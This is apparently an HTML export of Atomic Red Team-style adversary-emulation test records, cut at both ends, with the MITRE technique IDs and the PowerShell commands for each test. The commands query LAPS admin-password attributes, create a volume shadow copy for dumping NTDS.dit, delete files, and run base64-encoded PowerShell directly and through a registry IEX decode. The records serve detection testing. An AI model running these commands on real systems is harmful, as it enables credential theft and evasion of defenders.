<li><strong>description</strong>: This test executes LDAP query using powershell command Get-ADComputer and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Get-ADComputer #{hostname} -Properties *</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: None</li>
<li><strong>mitre_id</strong>: T1087.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 6e85bdf9-7bc4-4259-ac0f-f0cb39964443</li>
<li><strong>name</strong>: Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property</li>
<li><strong>description</strong>: This test executes LDAP query using powershell command Get-ADComputer and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: None</li>
<li><strong>mitre_id</strong>: T1087.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: ffbcfd62-15d6-4989-a21a-80bfc8e58bb5</li>
<li><strong>name</strong>: Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope</li>
<li><strong>description</strong>: This test executes LDAP query using powershell command Get-ADComputer with SearchScope as subtree and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Get-adcomputer -SearchScope subtree -filter "name -like '*'" -Properties *</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: None</li>
<li><strong>mitre_id</strong>: T1087.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 542bb97e-da53-436b-8e43-e0a7d31a6c24</li>
<li><strong>name</strong>: Create Volume Shadow Copy with Powershell</li>
<li><strong>description</strong>: This test is intended to be run on a domain Controller.</li>
</ul>
<p>The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: (gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1003.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 9dee89bd-9a98-4c4f-9e2d-4256690b0e72</li>
<li><strong>name</strong>: Delete a single file - Windows PowerShell</li>
<li>
<p><strong>description</strong>: Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Remove-Item -path #{file_to_delete}</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Path #{file_to_delete} | Out-Null</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1070.004</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: edd779e4-a509-4cba-8dfa-a112543dbfb1</li>
<li><strong>name</strong>: Delete an entire folder - Windows PowerShell</li>
<li>
<p><strong>description</strong>: Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Remove-Item -Path #{folder_to_delete} -Recurse</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Path #{folder_to_delete} -Type Directory | Out-Null</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1070.004</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a50d5a97-2531-499e-a1de-5544c74432c6</li>
<li><strong>name</strong>: Execute base64-encoded PowerShell</li>
<li><strong>description</strong>: Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.</li>
</ul>
<p>Upon successful execution, powershell will execute an encoded command and stdout default is "Write-Host "Hey, Atomic!"</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: $OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell.exe -EncodedCommand $EncodedCommand</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1027</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 450e7218-7915-4be4-8b9b-464a49eafcec</li>
<li><strong>name</strong>: Execute base64-encoded PowerShell from Windows Registry</li>
<li><strong>description</strong>: Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.</li>
</ul>
<p>Upon successful execution, powershell will execute encoded command and read/write from the registry.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: $OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand</li>
</ul>
<p>Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"</p>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage} -Name #{registry_entry_storage}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1027</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
